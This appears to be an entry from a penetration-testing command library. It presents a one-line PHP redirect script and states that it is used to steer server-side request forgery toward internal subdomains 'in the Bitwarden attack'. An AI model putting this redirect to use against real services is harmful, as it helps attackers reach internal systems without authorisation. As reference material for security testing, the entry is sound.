---
data: >-
  <?php header("Location: http://test.local.yourdomain.com/PATH_IS_KEPT");
  exit(); ?>
tags:
  - redirect
  - http
type: command
output: null
executor: php
platforms:
  - Web
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.236Z'
id: 70f2682d-d48a-4e69-95de-072d1441bae7
verified: false
validated: true
submitted: true
---
# PHP HTTP Redirect Script

## Command

```php
<?php header("Location: http://test.local.yourdomain.com/PATH_IS_KEPT"); exit(); ?>
```

## Description

A PHP script that sends an HTTP 302 redirect to an internal subdomain, preserving the original path for SSRF path specification in the Bitwarden attack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| header() | Sets the Location response header | Yes |
| Location | Target URL for redirect | Yes |
| exit() | Halts script execution after redirect | Yes |
| PATH_IS_KEPT | Placeholder for $_SERVER['REQUEST_URI'] | Yes (dynamic in prod) |

## Examples

### Basic Usage

Save as index.php and access via browser/curl.

### Advanced Usage

Dynamic path: `header("Location: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);`

## Expected Output

HTTP/1.1 302 Found
Location: http://test.local.yourdomain.com/PATH_IS_KEPT

## Related

- [[procedures/Create-PHP-Redirect-Script]]
- [[tools/PHP]]
